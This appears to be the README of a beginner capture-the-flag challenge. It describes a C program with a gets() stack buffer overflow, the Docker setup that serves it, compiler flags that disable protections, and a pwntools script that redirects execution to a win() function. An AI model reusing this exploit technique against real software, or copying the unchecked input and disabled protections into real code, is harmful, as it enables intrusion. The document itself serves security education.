# Oopsie - Stack Buffer Overflow Challenge

## Challenge Description

A simple C program with a classic stack-based buffer overflow vulnerability. The program uses `gets()` to read user input into a fixed-size buffer without bounds checking, allowing an attacker to overwrite the return address and redirect execution to a `win()` function that reveals the flag.

## Vulnerability

- **Function**: `vulnerable()`
- **Issue**: Uses `gets(buffer)` which does not perform bounds checking
- **Buffer size**: 32 bytes
- **Protection**: None (compiled with `-fno-stack-protector -z execstack -no-pie`)

## Files

- `main.c` - Source code
- `Makefile` - Build configuration with exploit-friendly flags
- `flag.txt` - Flag file (read by win function)
- `Dockerfile` - Multi-stage Docker build
- `docker-compose.yml` - Easy deployment
- `entrypoint.sh` - Socat wrapper for network exposure

## Building & Running

### Using Docker Compose (Recommended)
```bash
docker-compose up --build -d
```

### Using Docker directly
```bash
docker build -t oopsie .
docker run -d -p 1337:1337 --name oopsie oopsie
```

### Local compilation
```bash
make
./Oopsie
```

## Connecting to the Challenge

```bash
nc localhost 1337
```

## Exploitation

The goal is to overflow the 32-byte buffer and overwrite the return address to jump to the `win()` function.

1. Find the offset to the return address (32 bytes buffer + 8 bytes saved RBP = 40 bytes on x64)
2. Find the address of `win()` function
3. Send payload: `padding + address_of_win`

### Example Exploit (Python)
```python
from pwn import *

context.arch = 'amd64'

# Local testing
# p = process('./Oopsie')

# Remote
p = remote('localhost', 1337)

# Get win function address
elf = ELF('./Oopsie')
win_addr = elf.symbols['win']

# Offset: 32 bytes buffer + 8 bytes RBP = 40 bytes
payload = b'A' * 40 + p64(win_addr)

p.sendline(payload)
p.interactive()
```

## Flag

The flag is stored in `flag.txt` and printed by the `win()` function when successfully exploited.

Format: `0XATTACK{...}`

## Security Notes

This challenge is intentionally vulnerable for educational purposes. The binary is compiled with:
- No stack canaries (`-fno-stack-protector`)
- Executable stack (`-z execstack`)
- No PIE (`-no-pie`)
- No RELRO (default)

These settings make exploitation straightforward and are typical for beginner CTF challenges.